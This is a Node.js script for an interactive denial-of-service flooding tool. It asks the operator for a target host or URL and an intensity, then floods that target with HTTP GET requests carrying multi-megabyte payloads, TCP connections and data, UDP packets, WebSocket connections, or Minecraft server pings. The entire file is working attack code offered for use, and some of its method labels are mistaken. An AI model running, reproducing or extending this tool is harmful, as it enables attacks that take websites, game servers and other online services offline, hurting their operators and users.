const request = require('request');
const net = require('net');
const ICMP = require('ping');
const dgram = require('dgram');
const WebSocket = require('ws');
const mc = require('minecraft-protocol');
const readline = require('readline').createInterface({ input: process.stdin, output: process.stdout });

readline.question('Layer7: GET, WS \nLayer4: CNC, UDP, TCP \nLayer3: MCP \nEnter method: ', (method_input) => {
    if (method_input == 'GET') {
        readline.question('URL: ', (url) => {
            readline.question('Packet Size (megabytes): ', (size) => {
                readline.question('Time (seconds): ', (time) => {
                    readline.question('Multi requests: ', (requests) => {
                        const send_packets = setInterval(() => {
                            for (let i = 0; i < requests; i++) {
                                request({ uri: url, qs: { data: '0'.repeat(size * 1024 * 1024) }, json: true });
                            }
                        }, 1000)
                        setTimeout(() => {
                            clearInterval(send_packets)
                        }, time * 1000)
                    });
                });
            });
        });
    } else if (method_input == 'CNC') {
        readline.question('Host: ', (host) => {
            readline.question('Port: ', (port) => {
                readline.question('Time to build (seconds): ', (build_time) => {
                    readline.question('Flood Powrr (miliseconds): ', (power) => {
                        const connector = setInterval(() => {
                            net.createConnection({ host, port });
                        }, power);
                        setTimeout(() => {
                            clearInterval(connector)
                        }, build_time * 1000)
                    });
                });
            });
        });
    } else if (method_input == 'UDP') {
        readline.question('Host: ', (host) => {
            readline.question('Port: ', (port) => {
                readline.question('Packet Size (megabytes): ', (size) => {
                    if (size > 0.1) console.log('The maximum package size can be only 0.1 MB.') & process.exit(0);
                    readline.question('Packet Delay (miliseconds): ', (delay) => {
                        readline.question('Multi Packets: ', (multi) => {
                            readline.question('Time (seconds): ', (time) => {
                                const udp_sender = setInterval(() => {
                                    for (let i = 0; i < multi; i++) {
                                        const x = dgram.createSocket('udp4');
                                        const y_BytesNode = Buffer.alloc(size * 1024 * 1024 / 2, '01');
                                        x.send(y_BytesNode, 0, y_BytesNode.length, port, host, (error) => {
                                            if (error) {
                                                console.error(error);
                                            }
                                            x.close();
                                        });
                                    }
                                }, delay)
                                setTimeout(() => {
                                    clearInterval(udp_sender)
                                }, time * 1000)
                            });
                        });
                    });
                });
            });
        });
    } else if (method_input == 'TCP') {
        readline.question('Host: ', (host) => {
            readline.question('Port: ', (port) => {
                readline.question('Time (seconds): ', (time) => {
                    readline.question('Packet Size (MB): ', (size) => {
                        readline.question('Flood Power (miliseconds): ', (power) => {
                            const send_packets = setInterval(() => {
                                const client = new net.Socket();
                                client.connect(port, host, function () {
                                    client.write(Buffer.alloc(size * 1024 * 1024 / 2, '01'));
                                });
                            }, power)
                            setTimeout(() => {
                                clearInterval(send_packets)
                            }, time * 1000)
                        });
                    });
                });
            });
        });
    } else if (method_input == 'WS') {
        readline.question('Host (wss://example.com): ', (host) => {
            readline.question('Emit Packet: ', (packet_type_payload) => {
                readline.question('Flood Power (miliseconds): ', (power) => {
                    readline.question('Time (seconds): ', (time) => {
                        const tcp_createCon = setInterval(() => {
                            const tcp_tun = new WebSocket(host);
                            tcp_tun.on('open', () => {
                                tcp_tun.send(packet_type_payload);
                                tcp_tun.close();
                            });
                        }, power)
                        setTimeout(() => {
                            clearInterval(tcp_createCon)
                        }, time * 1000)
                    });
                });
            });
        });
    } else if (method_input == 'MCP') {
        readline.question('Host (1.1.1.1): ', (host) => {
            readline.question('Port: ', (port) => {
                readline.question('Time (seconds): ', (time) => {
                    readline.question('Workers: ', (workers) => {
                        readline.question('Flood Power (miliseconds): ', (power) => {
                            const mc_createCon = setInterval(() => {
                                for (let i = 0; i < workers; i++) {
                                    mc.ping({ host: host, port: port });
                                }
                            }, power)
                            setTimeout(() => {
                                clearInterval(mc_createCon)
                            }, time * 1000)
                        });
                    });
                });
            });
        });
    } else {
        console.log('Invalid method!')
    }
});
